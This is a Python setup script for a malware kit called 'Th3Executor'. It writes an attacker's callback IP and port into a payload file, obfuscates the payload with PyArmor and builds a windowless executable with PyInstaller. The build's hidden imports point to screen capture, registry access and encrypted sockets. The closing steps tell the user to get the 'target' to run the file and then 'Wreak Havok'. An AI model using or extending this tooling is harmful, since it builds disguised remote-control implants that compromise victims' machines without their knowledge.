# Main Libraries
import subprocess, os
import re
import time 
import shutil

def parse_pip_output(pip_output, library_name):
    if "Successfully installed" in pip_output:
        return f"[+] Successfully installed {library_name}!"
    elif "Requirement already satisfied" in pip_output:
        return f"[!] Library {library_name} already installed."
    elif "Defaulting to user installation because normal site-packages is not writeable" in pip_output:
        return f"[!] {library_name} installed in user site-packages due to permission issues."
    else:
        return f"[-] Unable to parse PIP output for {library_name}. The below snippet log was captured : {pip_output[:40]}"

def download_library(libraries):
    print("[*] Checking and downloading required PIP libraries")
    for library in libraries:
        command = ["pip", "install", library]
        try:
            result = subprocess.run(command, capture_output=True, text=True)
            if result.stdout or result.stderr: 
                output = parse_pip_output(result.stdout, library)
                print(output)
            else:
                print(f"No output available for {library}.")
        except Exception as err:
            print(f"[-] Unable to install {library}! Error: {err}. Skipping...")

def payload_conversion(file_name):
    os.chdir('dist')  # Navigate to the directory with the obfuscated script
    input_file = "payload.py"  # The obfuscated script
    runtime_dir = 'pyarmor_runtime_000000'
    
    # Ensure the data is added within the application's directory
    if os.name == 'nt':
        data_path = f"{runtime_dir};."
    else:
        data_path = f"{runtime_dir}:."

    # PyInstaller command updated to include multiple hidden imports and correct data path
    command = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", file_name,
        "--hidden-import", "Crypto",
        "--hidden-import", "Crypto.Util.number",
        "--hidden-import", "Crypto.Protocol.KDF",
        "--hidden-import", "Crypto.Hash",
        "--hidden-import", "Crypto.Cipher.ChaCha20",
        "--hidden-import", "Crypto.Random",
        "--hidden-import", "socket", 
        "--hidden-import", "time",
        "--hidden-import", "platform",
        "--hidden-import", "subprocess",
        "--hidden-import", "pickle",
        "--hidden-import", "winreg",
        "--hidden-import", "sys",
        "--hidden-import", "PIL.ImageGrab",
        "--add-data", data_path, 
        input_file
    ]
    
    print(f"[!] Processing the conversion of '{file_name}'. Please stand by, this may take some time.")
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    
    if result.returncode == 0:
        print(f"[+] Payload file has been converted to {file_name} and is now an executable.")
    else:
        exit(f"[-] A fatal error occurred: {result.stderr}")

    os.chdir('..')  # Return to the original directory

def obscure_code():
    # Check if the script exists
    if not os.path.exists("payload.py"):
        print(f"[-] Unable to find 'payload.py'. Please ensure this file is inside your 'th3executor' directory. Exiting!")
        return

    # The PyArmor command to obfuscate the script
    pyarmor_command = ["pyarmor", "gen", "payload.py"]

    try:
        result = subprocess.run(pyarmor_command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print("[+] Code obfuscation completed successfully.")
        else:
            print(f"[-] An error occurred during the obfuscation process: {result.stderr}")
            return
    except subprocess.CalledProcessError as e:
        print(f"[-] An error occurred while running PyArmor : {e}, this can be related to a file permission error")
    
def banner():
    banner = """
___________.__    ________ ___________                            __                
\__    ___/|  |__ \_____  \\\\_   _____/__  ___ ____   ____  __ ___/  |_  ___________ 
  |    |   |  |  \  _(__  < |    __)_\  \/  // __ \_/ ___\|  |  \   __\/  _ \_  __ \\
  |    |   |   Y  \/       \|        \>    <\  ___/\  \___|  |  /|  | (  <_> )  | \/
  |____|   |___|  /______  /_______  /__/\_ \\___  >\___  >____/ |__|  \____/|__|   
                \/       \/        \/      \/    \/     \/                                                                                                                                                                    
                        ⠀⡠⡠⠀⠀⠀⠀⢀⠄⠀⠀⠀⡠⠀⢀⠄⠀⠀⠀⡠⠂⠀⠀⠀⢀⠄⡠⠀⠀⠀
                        ⣀⠈⠀⠀⠐⢀⣔⣵⣄⠀⡠⠊⢀⠔⠁⠀⠀⡠⠊⠀⢀⢴⣧⣔⠡⠊⠀⠀⠀⢀
                        ⣿⣿⣦⣦⣴⣷⣿⣿⣿⣦⡀⠔⠁⠀⠀⡠⠊⠀⠀⠀⣰⣿⣿⣿⣶⣦⣴⣴⣾⣿
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⡠⠊⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⠸⣿⣿⣿⣿⣿⣿⣿⡿⠛⢿⣧⡈⠀⠀⠀⢀⢔⣽⡟⡫⣻⣿⣿⣿⣿⣿⣿⣿⠇
                        ⠀⠙⢿⣿⣿⣿⣿⡿⠀⡠⠊⠻⣿⣄⠀⠔⣡⣿⡯⠊⠀⢉⣿⣿⣿⣿⣿⡿⡋⠀
                        ⠀⠊⢈⠝⠿⣿⣿⣿⠊⠀⠀⠀⢙⢿⣧⣶⡿⠍⠀⢀⠔⡑⣽⣿⣿⠟⢫⢞⠁⠀
                        ⠀⠔⠁⠀⠀⡨⠊⠉⠕⠀⢀⠔⡡⣺⣿⣿⣄⢀⠔⡑⠁⠂⡫⠊⢀⠔⠑⠁⠀⠀
                        ⠀⠀⠀⡠⠊⠀⠀⠀⢀⠔⡡⢈⣴⣿⠏⢙⢿⣷⡀⠀⠀⠀⢀⠔⠕⠁⠀⡀⠀⠀
                        ⠀⡠⠊⠀⠀⠀⢀⠔⡡⠊⣠⣾⠟⢁⢔⠅⠉⠿⣿⣆⢀⢔⠕⠀⠀⠀⠀⡠⠂⠀
                        ⠀⠀⠀⠀⢀⠔⡡⠊⠠⣾⡿⢃⢔⠁⠀⠀⠀⠊⢹⢿⣶⡁⠀⠀⠈⡠⠊⠀⠀⠀
                        ⠀⠀⢀⠔⡡⠊⠀⢠⣾⢟⠔⠁⠁⠀⠠⠀⢀⢔⠑⠉⠿⣷⣄⠠⠊⠀⠀⢀⠄⠀
                        ⠀⠔⡡⠊⠠⣢⣴⡿⠟⠁⠀⠀⡀⠀⢀⠔⠑⠁⠀⠠⠈⡹⣿⣦⣄⢀⠔⠁⡀⠀
                        ⠀⠊⠀⠀⠀⢹⢿⡗⠁⠀⠀⠀⢀⠔⠕⠁⠀⡀⠀⡠⠊⠐⠹⢿⠗⠁⡠⠊⠀⠀
                        ⠀⠀⠀⠀⠐⠁⠁⠀⠀⠈⠀⠐⠑⠀⠀⠀⠀⠀⠊⠀⠀⠀⠐⠁⠀⠊⠀⠀⠀⠀ 
  _________       __                   _________            .__        __   
 /   _____/ _____/  |_ __ ________    /   _____/ ___________|__|______/  |_ 
 \_____  \_/ __ \   __\  |  \____ \   \_____  \_/ ___\_  __ \  \____ \   __\\
 /        \  ___/|  | |  |  /  |_> >  /        \  \___|  | \/  |  |_> >  |  
/_______  /\___  >__| |____/|   __/  /_______  /\___  >__|  |__|   __/|__|  
        \/     \/           |__|             \/     \/         |__|     
    """
    print(banner+"\n")

def main_menu_banner():
    banner = """                               
 _____                 _              
|   __|_ _ ___ ___ _ _| |_ ___ ___    
|   __|_'_| -_|  _| | |  _| . |  _|   
|_____|_,_|___|___|___|_| |___|_|                        
 _____     _        _____             
|     |___|_|___   |     |___ ___ _ _ 
| | | | .'| |   |  | | | | -_|   | | |
|_|_|_|__,|_|_|_|  |_|_|_|___|_|_|___| 
                                  
    """
    
    print(banner)

def clear_screen_banner(intro_message):
    if os.name == "nt": 
        os.system("cls")  
    else:
        subprocess.run(["clear"], shell=True, check=True) 
        
    banner()
    print("-> "+intro_message+" <-")

def validate_ip_and_port(ip_addr, port):
    ip_check, port_check = False, False
    
    ip_regex = r'^((192\.168|10)\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3})$'
    ip_check = re.match(ip_regex, ip_addr) is not None

    try:
        port_check = port.isdigit()
    except AttributeError:
        port_check = False

    return ip_check, port_check

def display_main_menu():    
    menu_options = {
        "1": "Full Installation and Checks - Install all required libraries and perform initial checks (Recommended for first usage)",
        "2": "Library Check and Installation - Verify and install necessary libraries only",
        "3": "Payload Configuration - Define the target and local information for the payload only",
        "4": "Executable Configuration - Set up options for payload conversion to executable format only",
    }

    # Clear the screen before displaying the menu, adjust depending on the OS
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
        
    main_menu_banner()
    
    print("Select one of the following options to proceed:\n")
    for key in sorted(menu_options):
        print(f"{key}) {menu_options[key]}")

# UPDATE THIS FUNCTION TO ENSURE ALL NEW LIBRARIES ARE ADDED!
def libraries_check_section(essential_libraries):
    clear_screen_banner("Installation Procedure") # Clear screen and show banner
    print("PIP LIBRARY SERVER INSTALLATION - Downloading required libraries . . . \n")

    download_library(essential_libraries)

    print("\nLIBRARY INSTALLATION COMPLETED")
    
def payload_configuration_section():
    clear_screen_banner("Payload Options Setup") # Clear screen and show banner for configuration mode
    print("PAYLOAD INITILIZATION - Define the target and local information . . . \n")

    while True:
        print("Local Host - Define an IP that the payload will connect to")
        ip_input = input("IP Address > ").strip()
        print("Local Port - Define an open port to listen on (payload will use this port also): ")
        port_input = input("Port Number > ").strip()
        
        ip_check, port_check = validate_ip_and_port(ip_input, port_input)
        if ip_check is False:
            print("\n[-] Invalid IP address, please try again ensuring the proper format!")
        elif port_check is False:
            print("\n[-] Invalid port number, please ensure data entered is numeric!")
        else:
            break
    
    print() # Clear clutter
    update_ip_port_in_payload(ip_input, port_input)
    print("\nPAYLOAD SETTINGS COMPLETED")

# UPDATE THIS FUNCTION TO ENSURE ALL NEW LIBRARIES ARE ADDED!
def executable_configuration_section(optional_libraries):
    clear_screen_banner("Executable Options Setup") # Clear screen and show banner for configuration mode
    print("PAYLOAD CONFIGURATION - Convert the payload file to a more runnable format . . . \n")

    print("[!] Conversion limitations are determined by your OS, this is not a program limitation but a library limitation used")
    if os.name == "nt": 
        print("[+] Payload can be converted to '.exe' windows format!")
    else:
        print("[+] Payload can be converted to a Linux executable format! (!Ensure you are a root user in the process!)")
        
    print() # Clear clutter
    print("Converting the payload to an executable requires the 'pyinstaller' and 'pyarmour' library, install and continue?")
    yes_no_userinput = input("Input (y/n) > ").lower().strip()

    if yes_no_userinput == "y":
        print() # Clear clutter
        download_library(optional_libraries)
        print() # Clear clutter
        print("Enter the name of your custom file")
        file_name = input("Executable Name > ").lower().strip()
        
        if len(file_name) == 0: 
            file_name = "executor_exe"
    else:
        exit("Aborted. Setup complete, Run the main program with 'python3 th3executor.py'")

    print("\nEXECUTABLE CONFIGURATION COMPLETED - Preparing to compile payload")
    time.sleep(3)
    
    ####################PYARMOUR OBSCURING ATTEMPT####################
    
    clear_screen_banner("Obfuscate payload & Convert") # Clear screen and show banner for configuration mode
    if os.name != "nt": print("[!] ! Ensure you are a root user in the process ! This process will fail if you arent")
    print("PAYLOAD SCRAMBLER - Attempting to disguise/obfuscate payload . . . \n")
    print("[!] Proceeding to compile and scramble the payload python file . . .")
    obscure_code()
    print() # Clear clutter

    ####################EXECUTABLE CONVERSION####################
    
    print("PAYLOAD CONVERSTION - Attempting to convert payload . . . \n")
    payload_conversion(file_name)
    print("[+] Payload successfully obscured and encoded!")
    print() # Clear clutter

    ####################DIRECTORY CLEANING####################

    print("DIRECTORY CLEANING - Attempting to clean left over files . . . \n")
    clean_directory(file_name)
    
    ####################END####################
    
    print("\nENCODING AND CONVERSION COMPLETED")

def setup_exit_section():
    clear_screen_banner("Setup Complete!")
    print("Th3Executor Setup Completed! Steps to follow :")
    print("""      > Ensure target runs the converted executable file
        > Run the 'th3executor' server script
        > Seamlessly connect to the target
        > EXECUTE and Wreak Havok""")

    exit("\nYou may now run 'python3 th3executor.py' to start th3executor on your local machine, Goodbye!")
 
def update_ip_port_in_payload(ip, port):
    file_path_payload = "payload.py"
    file_path_main = "th3executor.py"
    
    # Ensure the file paths are available
    if not os.path.exists(file_path_payload):
        print(f"[-] The file '{file_path_payload}' does not exist! Ensure you have {file_path_payload} in your current directory. Skipping options!")
        return
    if not os.path.exists(file_path_main):
        print(f"[-] The file '{file_path_main}' does not exist! Ensure you have {file_path_main} in your current directory. Skipping options!")
        return

    # Use variable names as the marker for the lines to be updated
    update_file(file_path_payload, f"srv_ip, srv_port = '{ip}', {port}", "srv_ip, srv_port")
    update_file(file_path_main, f"port = {port}", "port =")
    
def update_file(file_path, new_content, variable_names):
    # Open and read the source code file
    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    # The required comment that should be preserved
    comment = "# SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)"
    found = False
    for i, line in enumerate(lines):
        # Check if the line contains the variable names and the required comment
        if variable_names in line and comment in line:
            # Update the line while preserving the structure and the comment
            parts = line.split('#')
            new_line = f"{new_content} # {parts[1].strip()}\n"
            lines[i] = new_line
            found = True
            break

    # If the targeted line was found and updated, rewrite the file
    if found:
        with open(file_path, 'w', encoding='utf-8') as file:
            file.writelines(lines)
        print(f"[+] {file_path} updated successfully with the new content.")
    else:
        print(f"[-] Unable to find line to update in {file_path}. No updates made, please do this manually (refer to source code comments)")

def clean_directory(file_name):
    base_path = os.path.abspath('dist')

    # OS-specific executable extension
    executable_extension = '.exe' if os.name == 'nt' else ''
    executable_file = f"{file_name}{executable_extension}"

    def safe_remove(path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
        except Exception as e:
            print(f"[-] Failed to delete {path}: {str(e)}")

    # Paths of items to remove
    items_to_remove = [
        'pyarmor_runtime_000000',
        f"{file_name}.spec",
        'build',
        'payload.py'
    ]
    for item in items_to_remove:
        safe_remove(os.path.join(base_path, item))

    # Move executable to a higher directory level if it exists
    nested_dist_path = os.path.join(base_path, 'dist')
    executable_path = os.path.join(nested_dist_path, executable_file)
    target_executable_path = os.path.join(base_path, '..', executable_file)

    if os.path.exists(executable_path):
        try:
            shutil.move(executable_path, target_executable_path)
        except Exception as e:
            print(f"[-] Failed to move executable: {str(e)}")

    # Clean up the dist directory after moving the executable
    safe_remove(nested_dist_path)
    safe_remove(base_path)

    print("[+] Directory cleanup completed!")
        
server_libraries = ["pwntools", "termcolor", "pycryptodome", "uuid"] # Essential libraries
optional_libraries = ["pyarmor", "pyinstaller"] # For .exe conversion and payload code obfuscation

main_menu_banner()
print("[!] Notice : This setup assumes that : \n- You have not touched any of the internal source code\n- You have not modified the directory file names\n- You have the proper permissions")
print("\nIf any of the above have been modified, this setup may result in issues pertaining to certain modifications")
time.sleep(2)
input("\nPress 'enter' to continue if you understand the above . . .")

display_main_menu()
print() # Clear clutter

while True:
    try:
        user_choice = int(input("Choice > "))
    except KeyboardInterrupt:
        exit("[!] Keyboard Interrupt! Exiting setup . . .")
    except ValueError:
        print("[-] Ensure input is a number! Try again \n")
        continue
        
    if user_choice > 6 or user_choice < 1:
        print("[-] Invalid Command, Enter a number within the range of the menu! Try again")
    else:
        print(f"\nAccessing menu choice {user_choice} . . .")
        time.sleep(1.5)
        break

try:
    if user_choice == 1: # Full Installation
        libraries_check_section(server_libraries)
        time.sleep(3)
        payload_configuration_section()
        time.sleep(3)
        executable_configuration_section(optional_libraries)
    elif user_choice == 2: # Main Libraries check
        libraries_check_section(server_libraries)
        print("Also install optional libraries used for payload obsfucration and executable conversion?")
        additional_check = input("Choice (y/n) > ").lower().strip()
        if additional_check == "y":
            libraries_check_section(optional_libraries)
    elif user_choice == 3: # Payload configuration settings
        payload_configuration_section()
    elif user_choice == 4: # Payload to executable setup
        executable_configuration_section(optional_libraries)
except Exception as err:
    print(f"An unknown error has occured during the setup process -> {err}. Please try relaunching the program or else do a full installation")
else:
    time.sleep(4)
    setup_exit_section()